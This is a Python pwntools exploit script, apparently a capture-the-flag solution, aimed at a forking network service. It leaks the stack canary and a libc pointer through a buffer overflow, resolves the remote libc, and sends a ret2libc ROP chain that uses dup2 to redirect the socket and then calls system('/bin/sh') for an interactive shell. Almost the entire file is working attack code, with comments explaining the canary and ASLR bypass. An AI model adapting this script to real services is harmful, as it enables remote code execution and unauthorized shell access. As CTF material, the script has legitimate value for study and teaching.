#!/usr/bin/env python2

import binascii
from pwn import *

"""
This server fork, so I can rerun after leaking crucial information which allows us to bypass the canary and also defeat ASLR
On third choice of the binary, there is an overflow. If I send 10 chars, I can leak the SSP and some pointers since there is no nullbyte appended
It is kinda anoying cause apparently on the remote server, the SSP has 2 null bytes at the end, this is why I have special conditions for the remot server
Then I do a standard ret2libc
"""

###

if len(sys.argv) > 1:
    DEBUG = False
else:
    DEBUG = True
maxLen = 126

if DEBUG:
    libc = ELF("libc.so.6")
    offset = 0xdbce3
else:
# I identified the libc by leaking at least 2 offsets from the remote one and then using
# https://github.com/niklasb/libc-database
# the remote libc is: http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6-i386_2.23-0ubuntu3_amd64.deb
    libc = ELF("libc-2.23.so")
    offset = 0xd4443

###

### leak SSP + libc
if DEBUG:
    r = remote("localhost", 8888)
else:
    r = remote("challenge-ecw.fr", 8888)

r.recvuntil(">")
r.sendline("3")
r.recvuntil("n) ")
if DEBUG:
    p = "A" * 10
else:
    p = "A" * 11
r.sendline(p)
if DEBUG:
    r.recvuntil("A" * 10)
else:
    r.recvuntil("A" * 11)
if DEBUG:
    SSP = u32(r.recv(4)) - 0x0a
else:
    SSP = u32("\x00" + r.recv(3)) - 0x0a00

shit = u32(r.recv(4))
libCPtr = u32(r.recv(4)) # read+35
saveEBP = u32(r.recv(4))
EIP = u32(r.recv(4))
log.info("EIP: " + hex(EIP))
log.info("shit: " + hex(shit)) # bogus value
log.info("libCPtr: " + hex(libCPtr))
log.info("saveEBP: " + hex(saveEBP))
log.info("SSP: " + hex(SSP))
r.close()


### EXPLOIT PART
if DEBUG:
    r = remote("localhost", 8888)
else:
    r = remote("challenge-ecw.fr", 8888)

r.recvuntil(">")
r.sendline("3")
r.recvuntil("n) ")

ROP = "A" * 10 + p32(SSP) + p32(shit) + p32(libCPtr) + p32(saveEBP)

libcBase = libCPtr - offset
dup2 = libc.symbols["dup2"] + libcBase
system = libc.symbols["system"] + libcBase
binsh = list(libc.search("/bin/sh"))[0] + libcBase

log.info("libcBase: " + hex(libcBase))
log.info("system: " + hex(system))
log.info("dup2: " + hex(dup2))
log.info("binsh: " + hex(binsh))

ROP += p32(dup2)
ROP += p32(0x080490fe) # ppr
ROP += p32(4)
ROP += p32(0)
ROP += p32(dup2)
ROP += p32(0x080490fe) # ppr
ROP += p32(4)
ROP += p32(1)
ROP += p32(system)
ROP += p32(0xdeadbeef)
ROP += p32(binsh)
r.sendline(ROP)
r.interactive()

r.close()
